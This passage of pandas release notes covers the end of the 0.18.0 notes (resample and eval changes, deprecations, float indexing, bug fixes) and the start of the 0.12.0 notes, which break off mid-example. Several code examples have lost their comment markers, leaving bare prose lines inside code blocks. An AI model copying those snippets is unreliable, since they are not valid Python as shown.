Here is a typical use case:\n\n   .. code-block:: ipython\n\n      In [4]: r = df.resample('2s')\n\n      In [6]: r*10\n      pandas/tseries/resample.py:80: FutureWarning: .resample() is now a deferred operation\n      use .resample(...).mean() instead of .resample(...)\n\n      Out[6]:\n                            A         B         C         D\n      2010-01-01 09:00:00  4.857476  4.473507  3.570960  7.936154\n      2010-01-01 09:00:02  8.208011  7.943173  3.640340  5.310957\n      2010-01-01 09:00:04  4.339846  3.145823  4.241039  6.257326\n      2010-01-01 09:00:06  6.249881  6.097384  6.331650  6.124518\n      2010-01-01 09:00:08  5.104699  5.343172  5.732009  8.069486\n\n   However, getting and assignment operations directly on a ``Resampler`` will raise a ``ValueError``:\n\n   .. code-block:: ipython\n\n      In [7]: r.iloc[0] = 5\n      ValueError: .resample() is now a deferred operation\n      use .resample(...).mean() instead of .resample(...)\n\n   There is a situation where the new API can not perform all the operations when using original code.\n   This code is intending to resample every 2s, take the ``mean`` AND then take the ``min`` of those results.\n\n   .. code-block:: ipython\n\n      In [4]: df.resample('2s').min()\n      Out[4]:\n      A    0.433985\n      B    0.314582\n      C    0.357096\n      D    0.531096\n      dtype: float64\n\n   The new API will:\n\n   .. ipython:: python\n\n      df.resample('2s').min()\n\n   The good news is the return dimensions will differ between the new API and the old API, so this should loudly raise\n   an exception.\n\n   To replicate the original operation\n\n   .. ipython:: python\n\n      df.resample('2s').mean().min()\n\nChanges to eval\n^^^^^^^^^^^^^^^\n\nIn prior versions, new columns assignments in an ``eval`` expression resulted\nin an inplace change to the ``DataFrame``. (:issue:`9297`, :issue:`8664`, :issue:`10486`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({'a': np.linspace(0, 10, 5), 'b': range(5)})\n   df\n\n.. ipython:: python\n   :suppress:\n\n   df.eval('c = a + b', inplace=True)\n\n.. code-block:: ipython\n\n   In [12]: df.eval('c = a + b')\n   FutureWarning: eval expressions containing an assignment currentlydefault to operating inplace.\n   This will change in a future version of pandas, use inplace=True to avoid this warning.\n\n   In [13]: df\n   Out[13]:\n         a  b     c\n   0   0.0  0   0.0\n   1   2.5  1   3.5\n   2   5.0  2   7.0\n   3   7.5  3  10.5\n   4  10.0  4  14.0\n\nIn version 0.18.0, a new ``inplace`` keyword was added to choose whether the\nassignment should be done inplace or return a copy.\n\n.. ipython:: python\n\n   df\n   df.eval('d = c - b', inplace=False)\n   df\n   df.eval('d = c - b', inplace=True)\n   df\n\n.. warning::\n\n   For backwards compatibility, ``inplace`` defaults to ``True`` if not specified.\n   This will change in a future version of pandas. If your code depends on an\n   inplace assignment you should update to explicitly set ``inplace=True``\n\nThe ``inplace`` keyword parameter was also added the ``query`` method.\n\n.. ipython:: python\n\n   df.query('a > 5')\n   df.query('a > 5', inplace=True)\n   df\n\n.. warning::\n\n   Note that the default value for ``inplace`` in a ``query``\n   is ``False``, which is consistent with prior versions.\n\n``eval`` has also been updated to allow multi-line expressions for multiple\nassignments.  These expressions will be evaluated one at a time in order.  Only\nassignments are valid for multi-line expressions.\n\n.. ipython:: python\n\n   df\n   df.eval(\"\"\"\n   e = d + a\n   f = e - 22\n   g = f / 2.0\"\"\", inplace=True)\n   df\n\n\n.. _whatsnew_0180.api:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- ``DataFrame.between_time`` and ``Series.between_time`` now only parse a fixed set of time strings. Parsing of date strings is no longer supported and raises a ``ValueError``. (:issue:`11818`)\n\n  .. code-block:: ipython\n\n     In [107]: s = pd.Series(range(10), pd.date_range('2015-01-01', freq='H', periods=10))\n\n     In [108]: s.between_time(\"7:00am\", \"9:00am\")\n     Out[108]:\n     2015-01-01 07:00:00    7\n     2015-01-01 08:00:00    8\n     2015-01-01 09:00:00    9\n     Freq: H, Length: 3, dtype: int64\n\n  This will now raise.\n\n  .. code-block:: ipython\n\n     In [2]: s.between_time('20150101 07:00:00','20150101 09:00:00')\n     ValueError: Cannot convert arg ['20150101 07:00:00'] to a time.\n\n- ``.memory_usage()`` now includes values in the index, as does memory_usage in ``.info()`` (:issue:`11597`)\n- ``DataFrame.to_latex()`` now supports non-ascii encodings (eg ``utf-8``) in Python 2 with the parameter ``encoding`` (:issue:`7061`)\n- ``pandas.merge()`` and ``DataFrame.merge()`` will show a specific error message when trying to merge with an object that is not of type ``DataFrame`` or a subclass (:issue:`12081`)\n- ``DataFrame.unstack`` and ``Series.unstack`` now take ``fill_value`` keyword to allow direct replacement of missing values when an unstack results in missing values in the resulting ``DataFrame``. As an added benefit, specifying ``fill_value`` will preserve the data type of the original stacked data.  (:issue:`9746`)\n- As part of the new API for :ref:`window functions <whatsnew_0180.enhancements.moments>` and :ref:`resampling <whatsnew_0180.breaking.resample>`, aggregation functions have been clarified, raising more informative error messages on invalid aggregations. (:issue:`9052`). A full set of examples are presented in :ref:`groupby <groupby.aggregate>`.\n- Statistical functions for ``NDFrame`` objects (like ``sum(), mean(), min()``) will now raise if non-numpy-compatible arguments are passed in for ``**kwargs`` (:issue:`12301`)\n- ``.to_latex`` and ``.to_html`` gain a ``decimal`` parameter like ``.to_csv``; the default is ``'.'`` (:issue:`12031`)\n- More helpful error message when constructing a ``DataFrame`` with empty data but with indices (:issue:`8020`)\n- ``.describe()`` will now properly handle bool dtype as a categorical (:issue:`6625`)\n- More helpful error message with an invalid ``.transform`` with user defined input (:issue:`10165`)\n- Exponentially weighted functions now allow specifying alpha directly (:issue:`10789`) and raise ``ValueError`` if parameters violate ``0 < alpha <= 1`` (:issue:`12492`)\n\n.. _whatsnew_0180.deprecations:\n\nDeprecations\n^^^^^^^^^^^^\n\n.. _whatsnew_0180.window_deprecations:\n\n- The functions ``pd.rolling_*``, ``pd.expanding_*``, and ``pd.ewm*`` are deprecated and replaced by the corresponding method call. Note that\n  the new suggested syntax includes all of the arguments (even if default) (:issue:`11603`)\n\n  .. code-block:: ipython\n\n     In [1]: s = pd.Series(range(3))\n\n     In [2]: pd.rolling_mean(s,window=2,min_periods=1)\n             FutureWarning: pd.rolling_mean is deprecated for Series and\n                  will be removed in a future version, replace with\n                  Series.rolling(min_periods=1,window=2,center=False).mean()\n     Out[2]:\n             0    0.0\n             1    0.5\n             2    1.5\n             dtype: float64\n\n     In [3]: pd.rolling_cov(s, s, window=2)\n             FutureWarning: pd.rolling_cov is deprecated for Series and\n                  will be removed in a future version, replace with\n                  Series.rolling(window=2).cov(other=<Series>)\n     Out[3]:\n             0    NaN\n             1    0.5\n             2    0.5\n             dtype: float64\n\n- The ``freq`` and ``how`` arguments to the ``.rolling``, ``.expanding``, and ``.ewm`` (new) functions are deprecated, and will be removed in a future version. You can simply resample the input prior to creating a window function. (:issue:`11603`).\n\n  For example, instead of ``s.rolling(window=5,freq='D').max()`` to get the max value on a rolling 5 Day window, one could use ``s.resample('D').mean().rolling(window=5).max()``, which first resamples the data to daily data, then provides a rolling 5 day window.\n\n- ``pd.tseries.frequencies.get_offset_name`` function is deprecated. Use offset's ``.freqstr`` property as alternative (:issue:`11192`)\n- ``pandas.stats.fama_macbeth`` routines are deprecated and will be removed in a future version (:issue:`6077`)\n- ``pandas.stats.ols``, ``pandas.stats.plm`` and ``pandas.stats.var`` routines are deprecated and will be removed in a future version (:issue:`6077`)\n- show a ``FutureWarning`` rather than a ``DeprecationWarning`` on using long-time deprecated syntax in ``HDFStore.select``, where the ``where`` clause is not a string-like (:issue:`12027`)\n\n- The ``pandas.options.display.mpl_style`` configuration has been deprecated\n  and will be removed in a future version of pandas. This functionality\n  is better handled by matplotlib's `style sheets`_ (:issue:`11783`).\n\n\n.. _style sheets: http://matplotlib.org/users/style_sheets.html\n\n.. _whatsnew_0180.float_indexers:\n\nRemoval of deprecated float indexers\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn :issue:`4892` indexing with floating point numbers on a non-``Float64Index`` was deprecated (in version 0.14.0).\nIn 0.18.0, this deprecation warning is removed and these will now raise a ``TypeError``. (:issue:`12165`, :issue:`12333`)\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3], index=[4, 5, 6])\n   s\n   s2 = pd.Series([1, 2, 3], index=list('abc'))\n   s2\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n    this is label indexing\n   In [2]: s[5.0]\n   FutureWarning: scalar indexers for index type Int64Index should be integers and not floating point\n   Out[2]: 2\n\n    this is positional indexing\n   In [3]: s.iloc[1.0]\n   FutureWarning: scalar indexers for index type Int64Index should be integers and not floating point\n   Out[3]: 2\n\n    this is label indexing\n   In [4]: s.loc[5.0]\n   FutureWarning: scalar indexers for index type Int64Index should be integers and not floating point\n   Out[4]: 2\n\n    .ix would coerce 1.0 to the positional 1, and index\n   In [5]: s2.ix[1.0] = 10\n   FutureWarning: scalar indexers for index type Index should be integers and not floating point\n\n   In [6]: s2\n   Out[6]:\n   a     1\n   b    10\n   c     3\n   dtype: int64\n\nNew behavior:\n\nFor iloc, getting & setting via a float scalar will always raise.\n\n.. code-block:: ipython\n\n   In [3]: s.iloc[2.0]\n   TypeError: cannot do label indexing on <class 'pandas.indexes.numeric.Int64Index'> with these indexers [2.0] of <type 'float'>\n\nOther indexers will coerce to a like integer for both getting and setting. The ``FutureWarning`` has been dropped for ``.loc``, ``.ix`` and ``[]``.\n\n.. ipython:: python\n\n   s[5.0]\n   s.loc[5.0]\n\nand setting\n\n.. ipython:: python\n\n   s_copy = s.copy()\n   s_copy[5.0] = 10\n   s_copy\n   s_copy = s.copy()\n   s_copy.loc[5.0] = 10\n   s_copy\n\nPositional setting with ``.ix`` and a float indexer will ADD this value to the index, rather than previously setting the value by position.\n\n.. code-block:: ipython\n\n   In [3]: s2.ix[1.0] = 10\n   In [4]: s2\n   Out[4]:\n   a       1\n   b       2\n   c       3\n   1.0    10\n   dtype: int64\n\nSlicing will also coerce integer-like floats to integers for a non-``Float64Index``.\n\n.. ipython:: python\n\n   s.loc[5.0:6]\n\nNote that for floats that are NOT coercible to ints, the label based bounds will be excluded\n\n.. ipython:: python\n\n   s.loc[5.1:6]\n\nFloat indexing on a ``Float64Index`` is unchanged.\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3], index=np.arange(3.))\n   s[1.0]\n   s[1.0:2.5]\n\n.. _whatsnew_0180.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Removal of ``rolling_corr_pairwise`` in favor of ``.rolling().corr(pairwise=True)`` (:issue:`4950`)\n- Removal of ``expanding_corr_pairwise`` in favor of ``.expanding().corr(pairwise=True)`` (:issue:`4950`)\n- Removal of ``DataMatrix`` module. This was not imported into the pandas namespace in any event (:issue:`12111`)\n- Removal of ``cols`` keyword in favor of ``subset`` in ``DataFrame.duplicated()`` and ``DataFrame.drop_duplicates()`` (:issue:`6680`)\n- Removal of the ``read_frame`` and ``frame_query`` (both aliases for ``pd.read_sql``)\n  and ``write_frame`` (alias of ``to_sql``) functions in the ``pd.io.sql`` namespace,\n  deprecated since 0.14.0 (:issue:`6292`).\n- Removal of the ``order`` keyword from ``.factorize()`` (:issue:`6930`)\n\n.. _whatsnew_0180.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Improved performance of ``andrews_curves`` (:issue:`11534`)\n- Improved huge ``DatetimeIndex``, ``PeriodIndex`` and ``TimedeltaIndex``'s ops performance including ``NaT`` (:issue:`10277`)\n- Improved performance of ``pandas.concat`` (:issue:`11958`)\n- Improved performance of ``StataReader`` (:issue:`11591`)\n- Improved performance in construction of ``Categoricals`` with ``Series`` of datetimes containing ``NaT`` (:issue:`12077`)\n\n\n- Improved performance of ISO 8601 date parsing for dates without separators (:issue:`11899`), leading zeros (:issue:`11871`) and with white space preceding the time zone (:issue:`9714`)\n\n\n\n\n.. _whatsnew_0180.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in ``GroupBy.size`` when data-frame is empty. (:issue:`11699`)\n- Bug in ``Period.end_time`` when a multiple of time period is requested (:issue:`11738`)\n- Regression in ``.clip`` with tz-aware datetimes (:issue:`11838`)\n- Bug in ``date_range`` when the boundaries fell on the frequency (:issue:`11804`, :issue:`12409`)\n- Bug in consistency of passing nested dicts to ``.groupby(...).agg(...)`` (:issue:`9052`)\n- Accept unicode in ``Timedelta`` constructor (:issue:`11995`)\n- Bug in value label reading for ``StataReader`` when reading incrementally (:issue:`12014`)\n- Bug in vectorized ``DateOffset`` when ``n`` parameter is ``0`` (:issue:`11370`)\n- Compat for numpy 1.11 w.r.t. ``NaT`` comparison changes (:issue:`12049`)\n- Bug in ``read_csv`` when reading from a ``StringIO`` in threads (:issue:`11790`)\n- Bug in not treating ``NaT`` as a missing value in datetimelikes when factorizing & with ``Categoricals`` (:issue:`12077`)\n- Bug in getitem when the values of a ``Series`` were tz-aware (:issue:`12089`)\n- Bug in ``Series.str.get_dummies`` when one of the variables was 'name' (:issue:`12180`)\n- Bug in ``pd.concat`` while concatenating tz-aware NaT series. (:issue:`11693`, :issue:`11755`, :issue:`12217`)\n- Bug in ``pd.read_stata`` with version <= 108 files (:issue:`12232`)\n- Bug in ``Series.resample`` using a frequency of ``Nano`` when the index is a ``DatetimeIndex`` and contains non-zero nanosecond parts (:issue:`12037`)\n- Bug in resampling with ``.nunique`` and a sparse index (:issue:`12352`)\n- Removed some compiler warnings (:issue:`12471`)\n- Work around compat issues with ``boto`` in python 3.5 (:issue:`11915`)\n- Bug in ``NaT`` subtraction from ``Timestamp`` or ``DatetimeIndex`` with timezones (:issue:`11718`)\n- Bug in subtraction of ``Series`` of a single tz-aware ``Timestamp`` (:issue:`12290`)\n- Use compat iterators in PY2 to support ``.next()`` (:issue:`12299`)\n- Bug in ``Timedelta.round`` with negative values (:issue:`11690`)\n- Bug in ``.loc`` against ``CategoricalIndex`` may result in normal ``Index`` (:issue:`11586`)\n- Bug in ``DataFrame.info`` when duplicated column names exist (:issue:`11761`)\n- Bug in ``.copy`` of datetime tz-aware objects (:issue:`11794`)\n- Bug in ``Series.apply`` and ``Series.map`` where ``timedelta64`` was not boxed (:issue:`11349`)\n- Bug in ``DataFrame.set_index()`` with tz-aware ``Series`` (:issue:`12358`)\n\n\n\n- Bug in subclasses of ``DataFrame`` where ``AttributeError`` did not propagate (:issue:`11808`)\n- Bug groupby on tz-aware data where selection not returning ``Timestamp`` (:issue:`11616`)\n- Bug in ``pd.read_clipboard`` and ``pd.to_clipboard`` functions not supporting Unicode; upgrade included ``pyperclip`` to v1.5.15 (:issue:`9263`)\n- Bug in ``DataFrame.query`` containing an assignment (:issue:`8664`)\n\n- Bug in ``from_msgpack`` where ``__contains__()`` fails for columns of the unpacked ``DataFrame``, if the ``DataFrame`` has object columns. (:issue:`11880`)\n- Bug in ``.resample`` on categorical data with ``TimedeltaIndex`` (:issue:`12169`)\n\n\n- Bug in timezone info lost when broadcasting scalar datetime to ``DataFrame`` (:issue:`11682`)\n- Bug in ``Index`` creation from ``Timestamp`` with mixed tz coerces to UTC (:issue:`11488`)\n- Bug in ``to_numeric`` where it does not raise if input is more than one dimension (:issue:`11776`)\n- Bug in parsing timezone offset strings with non-zero minutes (:issue:`11708`)\n- Bug in ``df.plot`` using incorrect colors for bar plots under matplotlib 1.5+ (:issue:`11614`)\n- Bug in the ``groupby`` ``plot`` method when using keyword arguments (:issue:`11805`).\n- Bug in ``DataFrame.duplicated`` and ``drop_duplicates`` causing spurious matches when setting ``keep=False`` (:issue:`11864`)\n- Bug in ``.loc`` result with duplicated key may have ``Index`` with incorrect dtype (:issue:`11497`)\n- Bug in ``pd.rolling_median`` where memory allocation failed even with sufficient memory (:issue:`11696`)\n- Bug in ``DataFrame.style`` with spurious zeros (:issue:`12134`)\n- Bug in ``DataFrame.style`` with integer columns not starting at 0 (:issue:`12125`)\n- Bug in ``.style.bar`` may not rendered properly using specific browser (:issue:`11678`)\n- Bug in rich comparison of ``Timedelta`` with a ``numpy.array`` of ``Timedelta`` that caused an infinite recursion (:issue:`11835`)\n- Bug in ``DataFrame.round`` dropping column index name (:issue:`11986`)\n- Bug in ``df.replace`` while replacing value in mixed dtype ``Dataframe`` (:issue:`11698`)\n- Bug in ``Index`` prevents copying name of passed ``Index``, when a new name is not provided (:issue:`11193`)\n- Bug in ``read_excel`` failing to read any non-empty sheets when empty sheets exist and ``sheetname=None`` (:issue:`11711`)\n- Bug in ``read_excel`` failing to raise ``NotImplemented`` error when keywords ``parse_dates`` and ``date_parser`` are provided (:issue:`11544`)\n- Bug in ``read_sql`` with ``pymysql`` connections failing to return chunked data (:issue:`11522`)\n- Bug in ``.to_csv`` ignoring formatting parameters ``decimal``, ``na_rep``, ``float_format`` for float indexes (:issue:`11553`)\n- Bug in ``Int64Index`` and ``Float64Index`` preventing the use of the modulo operator (:issue:`9244`)\n- Bug in ``MultiIndex.drop`` for not lexsorted MultiIndexes (:issue:`12078`)\n\n- Bug in ``DataFrame`` when masking an empty ``DataFrame`` (:issue:`11859`)\n\n\n- Bug in ``.plot`` potentially modifying the ``colors`` input when the number of columns didn't match the number of series provided (:issue:`12039`).\n- Bug in ``Series.plot`` failing when index has a ``CustomBusinessDay`` frequency (:issue:`7222`).\n- Bug in ``.to_sql`` for ``datetime.time`` values with sqlite fallback (:issue:`8341`)\n- Bug in ``read_excel`` failing to read data with one column when ``squeeze=True`` (:issue:`12157`)\n- Bug in ``read_excel`` failing to read one empty column (:issue:`12292`, :issue:`9002`)\n- Bug in ``.groupby`` where a ``KeyError`` was not raised for a wrong column if there was only one row in the dataframe (:issue:`11741`)\n- Bug in ``.read_csv`` with dtype specified on empty data producing an error (:issue:`12048`)\n- Bug in ``.read_csv`` where strings like ``'2E'`` are treated as valid floats (:issue:`12237`)\n- Bug in building *pandas* with debugging symbols (:issue:`12123`)\n\n\n- Removed ``millisecond`` property of ``DatetimeIndex``. This would always raise a ``ValueError`` (:issue:`12019`).\n- Bug in ``Series`` constructor with read-only data (:issue:`11502`)\n- Removed ``pandas._testing.choice()``.  Should use ``np.random.choice()``, instead. (:issue:`12386`)\n- Bug in ``.loc`` setitem indexer preventing the use of a TZ-aware DatetimeIndex (:issue:`12050`)\n- Bug in ``.style`` indexes and MultiIndexes not appearing (:issue:`11655`)\n- Bug in ``to_msgpack`` and ``from_msgpack`` which did not correctly serialize or deserialize ``NaT`` (:issue:`12307`).\n- Bug in ``.skew`` and ``.kurt`` due to roundoff error for highly similar values (:issue:`11974`)\n- Bug in ``Timestamp`` constructor where microsecond resolution was lost if HHMMSS were not separated with ':' (:issue:`10041`)\n- Bug in ``buffer_rd_bytes`` src->buffer could be freed more than once if reading failed, causing a segfault (:issue:`12098`)\n\n- Bug in ``crosstab`` where arguments with non-overlapping indexes would return a ``KeyError`` (:issue:`10291`)\n\n- Bug in ``DataFrame.apply`` in which reduction was not being prevented for cases in which ``dtype`` was not a numpy dtype (:issue:`12244`)\n- Bug when initializing categorical series with a scalar value. (:issue:`12336`)\n- Bug when specifying a UTC ``DatetimeIndex`` by setting ``utc=True`` in ``.to_datetime`` (:issue:`11934`)\n- Bug when increasing the buffer size of CSV reader in ``read_csv`` (:issue:`12494`)\n- Bug when setting columns of a ``DataFrame`` with duplicate column names (:issue:`12344`)\n\n\n.. _whatsnew_0.18.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.17.1..v0.18.0\n\n\n.. _whatsnew_0120:\n\nVersion 0.12.0 (July 24, 2013)\n------------------------------\n\n{{ header }}\n\n\nThis is a major release from 0.11.0 and includes several new features and\nenhancements along with a large number of bug fixes.\n\nHighlights include a consistent I/O API naming scheme, routines to read html,\nwrite MultiIndexes to csv files, read & write STATA data files, read & write JSON format\nfiles, Python 3 support for ``HDFStore``, filtering of groupby expressions via ``filter``, and a\nrevamped ``replace`` routine that accepts regular expressions.\n\nAPI changes\n~~~~~~~~~~~\n\n  - The I/O API is now much more consistent with a set of top level ``reader`` functions\n    accessed like ``pd.read_csv()`` that generally return a ``pandas`` object.\n\n    * ``read_csv``\n    * ``read_excel``\n    * ``read_hdf``\n    * ``read_sql``\n    * ``read_json``\n    * ``read_html``\n    * ``read_stata``\n    * ``read_clipboard``\n\n    The corresponding ``writer`` functions are object methods that are accessed like ``df.to_csv()``\n\n    * ``to_csv``\n    * ``to_excel``\n    * ``to_hdf``\n    * ``to_sql``\n    * ``to_json``\n    * ``to_html``\n    * ``to_stata``\n    * ``to_clipboard``\n\n\n  - Fix modulo and integer division on Series,DataFrames to act similarly to ``float`` dtypes to return\n    ``np.nan`` or ``np.inf`` as appropriate (:issue:`3590`). This correct a numpy bug that treats ``integer``\n    and ``float`` dtypes differently.\n\n    .. ipython:: python\n\n        p = pd.DataFrame({\"first\": [4, 5, 8], \"second\": [0, 0, 3]})\n        p % 0\n        p % p\n        p / p\n        p / 0\n\n  - Add ``squeeze`` keyword to ``groupby`` to allow reduction from\n    DataFrame -> Series if groups are unique. This is a Regression from 0.10.1.\n    We are reverting back to the prior behavior. This means groupby will return the\n    same shaped objects whether the groups are unique or not. Revert this issue (:issue:`2893`)\n    with (:issue:`3596`).\n\n    .. code-block:: ipython\n\n        In [2]: df2 = pd.DataFrame([{\"val1\": 1, \"val2\": 20},\n           ...:                     {\"val1\": 1, \"val2\": 19},\n           ...:                     {\"val1\": 1, \"val2\": 27},\n           ...:                     {\"val1\": 1, \"val2\": 12}])\n\n        In [3]: def func(dataf):\n           ...:     return dataf[\"val2\"] - dataf[\"val2\"].mean()\n           ...:\n\n        In [4]:  squeezing the result frame to a series (because we have unique groups)\n           ...: df2.groupby(\"val1\", squeeze=True).apply(func)\n        Out[4]:\n        0    0.5\n        1   -0.5\n        2    7.5\n        3   -7.5\n        Name: 1, dtype: float64\n\n        In [5]:  no squeezing (the default, and behavior in 0.10.1)\n           ...: df2.groupby(\"val1\").apply(func)\n        Out[5]:\n        val2    0    1    2    3\n        val1\n        1     0.5 -0.5  7.5 -7.5\n\n  - Raise on ``iloc`` when boolean indexing with a label based indexer mask\n    e.g. a boolean Series, even with integer labels, will raise. Since ``iloc``\n    is purely positional based, the labels on the Series are not alignable (:issue:`3631`)\n\n    This case is rarely used, and there are plenty of alternatives. This preserves the\n    ``iloc`` API to be *purely* positional based.\n\n    .. ipython:: python\n\n       df = pd.DataFrame(range(5), index=list(\"ABCDE\"), columns=[\"a\"])\n       mask = df.a % 2 == 0\n       mask\n\n        this is what you should use\n       df.loc[mask]\n\n        this will work as well\n       df.iloc[mask.values]\n\n    ``df.iloc[mask]`` will raise a ``ValueError``\n\n  - The ``raise_on_error`` argument to plotting functions is removed. Instead,\n    plotting functions raise a ``TypeError`` when the ``dtype`` of the object\n    is ``object`` to remind you to avoid ``object`` arrays whenever possible\n    and thus you should cast to an appropriate numeric dtype if you need to\n    plot something.\n\n  - Add ``colormap`` keyword to DataFrame plotting methods. Accepts either a\n    matplotlib colormap object (ie, matplotlib.cm.jet) or a string name of such\n    an object (ie, 'jet'). The colormap is sampled to select the color for each\n    column. Please see :ref:`visualization.colormaps` for more information.\n    (:issue:`3860`)\n\n  - ``DataFrame.interpolate()`` is now deprecated. Please use\n    ``DataFrame.fillna()`` and ``DataFrame.replace()`` instead. (:issue:`3582`,\n    :issue:`3675`, :issue:`3676`)\n\n  - the ``method`` and ``axis`` arguments of ``DataFrame.replace()`` are\n    deprecated\n\n  - ``DataFrame.replace`` 's ``infer_types`` parameter is removed and now\n    performs conversion by default. (:issue:`3907`)\n\n  - Add the keyword ``allow_duplicates`` to ``DataFrame.insert`` to allow a duplicate column\n    to be inserted if ``True``, default is ``False`` (same as prior to 0.12) (:issue:`3679`)\n  - Implement ``__nonzero__`` for ``NDFrame`` objects (:issue:`3691`, :issue:`3696`)\n\n  - IO api\n\n    - added top-level function ``read_excel`` to replace the following,\n      The original API is deprecated and will be removed in a future version\n\n      .. code-block:: python\n\n         from pandas.io.parsers import ExcelFile\n\n         xls = ExcelFile(\"path_to_file.xls\")\n         xls.parse(\"Sheet1\", index_col=None, na_values=[\"NA\"])\n\n      With\n\n      .. code-block:: python\n\n         import pandas as pd\n\n         pd.read_excel(\"path_to_file.xls\", \"Sheet1\", index_col=None, na_values=[\"NA\"])\n\n    - added top-level function ``read_sql`` that is equivalent to the following\n\n      .. code-block:: python\n\n         from pandas.io.sql import read_frame\n\n         read_frame(...)\n\n  - ``DataFrame.to_html`` and ``DataFrame.to_latex`` now accept a path for\n    their first argument (:issue:`3702`)\n\n  - Do not allow astypes on ``datetime64[ns]`` except to ``object``, and\n    ``timedelta64[ns]`` to ``object/int`` (:issue:`3425`)\n\n  - The behavior of ``datetime64`` dtypes has changed with respect to certain\n    so-called reduction operations (:issue:`3726`). The following operations now\n    raise a ``TypeError`` when performed on a ``Series`` and return an *empty*\n    ``Series`` when performed on a ``DataFrame`` similar to performing these\n    operations on, for example, a ``DataFrame`` of ``slice`` objects:\n\n    - sum, prod, mean, std, var, skew, kurt, corr, and cov\n\n  - ``read_html`` now defaults to ``None`` when reading, and falls back on\n    ``bs4`` + ``html5lib`` when lxml fails to parse. a list of parsers to try\n    until success is also valid\n\n  - The internal ``pandas`` class hierarchy has changed (slightly). The\n    previous ``PandasObject`` now is called ``PandasContainer`` and a new\n    ``PandasObject`` has become the base class for ``PandasContainer`` as well\n    as ``Index``, ``Categorical``, ``GroupBy``, ``SparseList``, and\n    ``SparseArray`` (+ their base classes). Currently, ``PandasObject``\n    provides string methods (from ``StringMixin``). (:issue:`4090`, :issue:`4092`)\n\n  - New ``StringMixin`` that, given a ``__unicode__`` method, gets python 2 and\n    python 3 compatible string methods (``__str__``, ``__bytes__``, and\n    ``__repr__``). Plus string safety throughout. Now employed in many places\n    throughout the pandas library. (:issue:`4090`, :issue:`4092`)\n\nIO enhancements\n~~~~~~~~~~~~~~~\n\n  - ``pd.read_html()`` can now parse HTML strings, files or urls and return\n    DataFrames, courtesy of cpcloud. (:issue:`3477`, :issue:`3605`, :issue:`3606`, :issue:`3616`).\n    It works with a *single* parser backend: BeautifulSoup4 + html5lib :ref:`See the docs<io.html>`\n\n    You can use ``pd.read_html()`` to read the output from ``DataFrame.to_html()`` like so\n\n    .. ipython:: python\n       :okwarning:\n\n        df = pd.DataFrame({\"a\": range(3), \"b\": list(\"abc\")})\n        print(df)\n        html = df.to_html()\n        alist = pd.read_html(html, index_col=0)\n        print(df == alist[0])\n\n    Note that ``alist`` here is a Python ``list`` so ``pd.read_html()`` and\n    ``DataFrame.to_html()`` are not inverses.\n\n    - ``pd.read_html()`` no longer performs hard conversion of date strings\n      (:issue:`3656`).\n\n    .. warning::\n\n      You may have to install an older version of BeautifulSoup4,\n      :ref:`See the installation docs<install.optional_dependencies>`\n\n  - Added module for reading and writing Stata files: ``pandas.io.stata`` (:issue:`1512`)\n    accessible via ``read_stata`` top-level function for reading,\n    and ``to_stata`` DataFrame method for writing, :ref:`See the docs<io.stata>`\n\n  - Added module for reading and writing json format files: ``pandas.io.json``\n    accessible via ``read_json`` top-level function for reading,\n    and ``to_json`` DataFrame method for writing, :ref:`See the docs<io.json>`\n    various issues (:issue:`1226`, :issue:`3804`, :issue:`3876`, :issue:`3867`, :issue:`1305`)\n\n  - ``MultiIndex`` column support for reading and writing csv format files\n\n    - The ``header`` option in ``read_csv`` now accepts a\n      list of the rows from which to read the index.\n\n    - The option, ``tupleize_cols`` can now be specified in both ``to_csv`` and\n      ``read_csv``, to provide compatibility for the pre 0.12 behavior of\n      writing and reading ``MultIndex`` columns via a list of tuples. The default in\n      0.12 is to write lists of tuples and *not* interpret list of tuples as a\n      ``MultiIndex`` column.\n\n      Note: The default behavior in 0.12 remains unchanged from prior versions, but starting with 0.13,\n      the default *to* write and read ``MultiIndex`` columns will be in the new\n      format. (:issue:`3571`, :issue:`1651`, :issue:`3141`)\n\n    - If an ``index_col`` is not specified (e.g. you don't have an index, or wrote it\n      with ``df.to_csv(..., index=False``), then any ``names`` on the columns index will\n      be *lost*.\n\n      .. ipython:: python\n\n         mi_idx = pd.MultiIndex.from_arrays([[1, 2, 3, 4], list(\"abcd\")], names=list(\"ab\"))\n         mi_col = pd.MultiIndex.from_arrays([[1, 2], list(\"ab\")], names=list(\"cd\"))\n         df = pd.DataFrame(np.ones((4, 2)), index=mi_idx, columns=mi_col)\n         df.to_csv(\"mi.csv\")\n         print(open(\"mi.csv\").read())\n         pd.read_csv(\"mi.csv\", header=[0, 1, 2, 3], index_col=[0, 1])\n\n      .. ipython:: python\n         :suppress:\n\n         import os\n\n         os.remove(\"mi.csv\")\n\n  - Support for ``HDFStore`` (via ``PyTables 3.0.0``) on Python3\n\n  - Iterator support via ``read_hdf`` that automatically opens and closes the\n    store when iteration is finished. This is only for *tables*\n\n    .. code-block:: ipython\n\n        In [25]: path = 'store_iterator.h5'\n\n        In [26]: pd.DataFrame(np.random.randn(10, 2)).to_hdf(path, 'df', table=True)\n\n        In [27]: for df in pd.read_hdf(path, 'df', chunksize=3):\n           ....:     print(df)\n           ....:\n                  0         1\n        0  0.713216 -0.778461\n        1 -0.661062  0.862877\n        2  0.344342  0.149565\n                  0         1\n        3 -0.626968 -0.875772\n        4 -0.930687 -0.218983\n        5  0.949965 -0.442354\n                  0         1\n        6 -0.402985  1.111358\n        7 -0.241527 -0.670477\n        8  0.049355  0.632633\n                  0         1\n        9 -1.502767 -1.225492\n\n\n\n  - ``read_csv`` will now throw a more informative error message when a file\n    contains no columns, e.g., all newline characters\n\nOther enhancements\n~~~~~~~~~~~~~~~~~~\n\n  - ``DataFrame.replace()`` now allows regular expressions on contained\n    ``Series`` with object dtype. See the examples section in the regular docs\n    :ref:`Replacing via String Expression <missing_data.replace_expression>`\n\n    For example you can do\n\n    .. ipython:: python\n\n        df = pd.DataFrame({\"a\": list(\"ab..\"), 